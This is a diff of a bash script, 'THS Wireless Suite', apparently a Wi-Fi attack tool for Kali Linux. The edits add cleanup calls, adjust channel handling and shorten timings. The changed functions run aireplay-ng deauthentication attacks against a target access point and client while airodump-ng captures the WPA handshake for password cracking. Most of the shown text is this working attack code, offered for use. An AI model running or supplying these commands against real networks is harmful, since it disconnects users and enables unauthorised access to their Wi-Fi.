@@ -2,7 +2,7 @@
 #THS Wireless Suite
 #thsuite.sh v0.1
 #By TAPE
-#Last edit 12-08-2013 18:00
+#Last edit 12-08-2013 20:00
 #Written, and intended for use on CR4CK3RB0X -- THS-OS v3
 #Tested with success on Kali Linux
 #Source: http://thsuite.googlecode.com/svn/thsuite.sh
@@ -521,6 +521,7 @@ f_menu
 f_list_wireless() {
 clear
 f_header
+f_clean
 echo $BLU">$STD THSuite scans / captures"
 if [ ! -e /root/THS_TMP/ ] ; then
 echo -e $RED"\n >> No previous THSuite scans detected <<"
@@ -1018,6 +1019,7 @@ f_menu
 ### SCAN ASSIST WPA FUNCTION
 ############################
 f_scan_assist_wpa() {
+f_clean
 DATE=$(date +"%Y%m%d-%H%M")
 FILEOUT="$TARGET_AP$DATE".cap
 echo  -ne $GRN">$STD Enter channel to scan on (Hit Enter for all channels): $GRN"
@@ -1117,12 +1119,14 @@ TARGET_AP=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print
 TARGET_CHAN=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
 TARGET_CL=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $2}')
 #
+if [ "$DIFACE" != "$IFACE" ] ; then
 iwconfig $DIFACE channel $TARGET_CHAN
 sleep 0.5
+fi
 echo $GRN">$STD Attempting to force & capture handshake"
 NAME=$(echo $TARGET_AP | sed 's/:/-/g')
 FILENAME="HANDSHAKE-$NAME"
-sleep 4 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $DIFACE -0 5 -a $TARGET_AP -c $TARGET_CL \
+sleep 3 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $DIFACE -0 5 -a $TARGET_AP -c $TARGET_CL \
 & timeout 15 xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap -w $SAVEDIR$FILENAME
 #
 echo $GRN">$STD Deauth attempt on target AP complete"
@@ -1137,7 +1141,7 @@ TARGET_CL=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print
 echo $GRN">$STD Attempting to force & capture handshake"
 NAME=$(echo $TARGET_AP | sed 's/:/-/g')
 FILENAME="HANDSHAKE-$NAME"
-sleep 4 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $IFACE -0 5 -a $TARGET_AP -c $TARGET_CL \
+sleep 3 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $IFACE -0 5 -a $TARGET_AP -c $TARGET_CL \
 & timeout 15 xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap -w $SAVEDIR$FILENAME
 #
 echo $GRN">$STD Deauth attempt on target AP complete"
